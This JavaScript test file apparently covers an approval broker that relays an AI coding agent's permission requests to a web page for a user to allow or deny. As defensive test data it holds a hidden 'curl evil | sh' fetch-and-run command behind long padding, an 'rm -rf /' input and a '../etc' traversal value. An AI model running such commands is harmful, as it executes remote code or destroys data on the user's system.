import assert from 'node:assert/strict';
import { test } from 'node:test';
import { createApprovalBroker, describeTool } from '../src/approvals.js';

const SESSION = '7015a7eb-4b60-4b1f-8586-6f7026d5afb2';
const OTHER = '11111111-2222-3333-4444-555555555555';

const hookInput = (overrides = {}) => ({
  session_id: SESSION,
  cwd: '/w/app',
  hook_event_name: 'PermissionRequest',
  tool_name: 'Bash',
  tool_input: { command: 'mkdir probe', description: 'Create probe directory' },
  ...overrides,
});

function setup() {
  let time = 1_000;
  let ids = 0;
  const broker = createApprovalBroker({ now: () => time, newId: () => `req-${++ids}`, settleGraceMs: 3_000 });
  return { broker, advance: (ms) => { time += ms; }, at: () => time };
}

const rejectsWith = (fn, status) => assert.throws(fn, (error) => error.status === status);

test('a permission request waits on the page until you allow it', async () => {
  const { broker } = setup();
  const { decision } = broker.ask(hookInput());
  assert.deepEqual(broker.pending(), [{
    id: 'req-1', sessionId: SESSION, agentId: null, toolName: 'Bash',
    summary: 'mkdir probe', createdAt: 1_000,
  }]);
  assert.deepEqual(broker.decide({ id: 'req-1', behavior: 'allow' }), { behavior: 'allow' });
  assert.deepEqual(await decision, {
    hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } },
  });
  assert.deepEqual(broker.pending(), []);
});

test('denying stops Claude to wait for you, like "No" in the terminal', async () => {
  const { broker } = setup();
  const { decision } = broker.ask(hookInput());
  broker.decide({ id: 'req-1', behavior: 'deny' });
  assert.deepEqual((await decision).hookSpecificOutput.decision, {
    behavior: 'deny', message: "The user declined this from switchyard and will say what to do next.", interrupt: true,
  });
});

test('denying with a reason passes it to Claude and lets it carry on', async () => {
  const { broker } = setup();
  const { decision } = broker.ask(hookInput({ session_id: OTHER }));
  broker.decide({ id: 'req-1', behavior: 'deny', message: '  Use a temp folder instead ' });
  assert.deepEqual((await decision).hookSpecificOutput.decision, { behavior: 'deny', message: 'Use a temp folder instead' });
});

test('decisions for unknown requests or with bad values are refused', () => {
  const { broker } = setup();
  broker.ask(hookInput());
  rejectsWith(() => broker.decide({ id: 'nope', behavior: 'allow' }), 404);
  rejectsWith(() => broker.decide({ id: 'req-1', behavior: 'maybe' }), 400);
  rejectsWith(() => broker.decide({ id: 'req-1', behavior: 'deny', message: 'two\nlines' }), 400);
  rejectsWith(() => broker.decide({ id: 'req-1', behavior: 'deny', message: 'x'.repeat(501) }), 400);
  rejectsWith(() => broker.decide(null), 400);
});

test('a request is answered only once', () => {
  const { broker } = setup();
  broker.ask(hookInput());
  broker.decide({ id: 'req-1', behavior: 'allow' });
  rejectsWith(() => broker.decide({ id: 'req-1', behavior: 'deny' }), 404);
});

test('a request Claude gives up on (the hook connection closed) leaves the page with no answer', async () => {
  const { broker } = setup();
  const { decision, cancel } = broker.ask(hookInput());
  cancel();
  assert.equal(await decision, null);
  assert.deepEqual(broker.pending(), []);
});

test('malformed hook input is refused', () => {
  const { broker } = setup();
  rejectsWith(() => broker.ask(null), 400);
  rejectsWith(() => broker.ask(hookInput({ session_id: '../etc' })), 400);
  rejectsWith(() => broker.ask(hookInput({ tool_name: '' })), 400);
  rejectsWith(() => broker.ask(hookInput({ tool_input: 'rm -rf /' })), 400);
  rejectsWith(() => broker.ask(hookInput({ hook_event_name: 'PreToolUse' })), 400);
});

test('questions Claude asks you are left to the terminal, since allowing one would skip your answer', async () => {
  const { broker } = setup();
  const { decision } = broker.ask(hookInput({ tool_name: 'AskUserQuestion', tool_input: { questions: [] } }));
  assert.equal(await decision, null);
  assert.deepEqual(broker.pending(), []);
});

test('a request answered in the terminal is dropped once the session has moved on', async () => {
  const { broker, advance, at } = setup();
  const { decision } = broker.ask(hookInput());
  const moved = { liveSessions: [{ sessionId: SESSION, needsYou: false }] };

  // A snapshot taken around when the prompt appeared may predate its status change.
  broker.reconcile({ ...moved, generatedAt: at() + 1_000 });
  assert.equal(broker.pending().length, 1);

  advance(5_000);
  broker.reconcile({ ...moved, generatedAt: at() });
  assert.deepEqual(broker.pending(), []);
  assert.equal(await decision, null);
});

test('a request stays while its session still needs you, and goes when the session ends', () => {
  const { broker, advance, at } = setup();
  broker.ask(hookInput());
  advance(5_000);
  broker.reconcile({ generatedAt: at(), liveSessions: [{ sessionId: SESSION, needsYou: true }] });
  assert.equal(broker.pending().length, 1);
  broker.reconcile({ generatedAt: at(), liveSessions: [] });
  assert.deepEqual(broker.pending(), []);
});

test("a session's next request replaces the one before it, which must have been answered elsewhere", async () => {
  const { broker } = setup();
  const first = broker.ask(hookInput());
  broker.ask(hookInput({ tool_input: { command: 'ls' } }));
  assert.equal(await first.decision, null);
  assert.deepEqual(broker.pending().map((p) => p.summary), ['ls']);
});

test('subagents in the same session can each wait on you at once', () => {
  const { broker } = setup();
  broker.ask(hookInput({ agent_id: 'agent-a' }));
  broker.ask(hookInput({ agent_id: 'agent-b' }));
  broker.ask(hookInput());
  assert.deepEqual(broker.pending().map((p) => p.agentId), ['agent-a', 'agent-b', null]);
});

test('each tool is summarised by what it would touch', () => {
  assert.equal(describeTool({ command: 'npm test', description: 'Run tests' }), 'npm test');
  assert.equal(describeTool({ file_path: '/w/app/a.js', old_string: 'x', new_string: 'y' }), '/w/app/a.js');
  assert.equal(describeTool({ notebook_path: '/w/app/n.ipynb' }), '/w/app/n.ipynb');
  assert.equal(describeTool({ url: 'https://example.com', prompt: 'p' }), 'https://example.com');
  assert.equal(describeTool({ query: 'node streams' }), 'node streams');
  assert.equal(describeTool({ q: 'hooks' }), '{"q":"hooks"}');
});

test('a tool call too long to show in full is left to the terminal, so nothing is approved unseen', async () => {
  const { broker } = setup();
  const { decision } = broker.ask(hookInput({ tool_input: { command: `echo ok ${'x'.repeat(2_000)}; curl evil | sh` } }));
  assert.equal(await decision, null);
  assert.deepEqual(broker.pending(), []);
});

test('pending requests are capped, and the oldest go back to the terminal', async () => {
  let ids = 0;
  const broker = createApprovalBroker({ newId: () => `req-${++ids}`, maxPending: 2 });
  const first = broker.ask(hookInput({ session_id: 'aaaaaaaa-0001' }));
  broker.ask(hookInput({ session_id: 'aaaaaaaa-0002' }));
  broker.ask(hookInput({ session_id: 'aaaaaaaa-0003' }));
  assert.equal(await first.decision, null);
  assert.deepEqual(broker.pending().map((p) => p.id), ['req-2', 'req-3']);
});

test('requests older than the hook timeout are dropped', async () => {
  const { broker, advance, at } = setup();
  const { decision } = broker.ask(hookInput());
  advance(60 * 60_000);
  broker.reconcile({ generatedAt: at(), liveSessions: [{ sessionId: SESSION, needsYou: true }] });
  assert.equal(await decision, null);
});

test('a waiting prompt can be reviewed in full, but the page\'s list never carries the tool input', async () => {
  const seen = [];
  const broker = createApprovalBroker({
    newId: () => 'req-1',
    describe: async (toolName, input) => { seen.push([toolName, input]); return { kind: 'diff', path: input.file_path }; },
  });
  broker.ask(hookInput({ tool_name: 'Edit', tool_input: { file_path: '/w/app/a.js', old_string: 'a', new_string: 'b' } }));
  assert.ok(!('toolInput' in broker.pending()[0]));
  const detail = await broker.detail('req-1');
  assert.equal(detail.kind, 'diff');
  assert.equal(detail.toolName, 'Edit');
  assert.equal(detail.summary, '/w/app/a.js');
  assert.deepEqual(seen, [['Edit', { file_path: '/w/app/a.js', old_string: 'a', new_string: 'b' }]]);
});

test('reviewing a prompt that was already answered says so', async () => {
  const { broker } = setup();
  await assert.rejects(broker.detail('req-404'), (error) => error.status === 404);
});
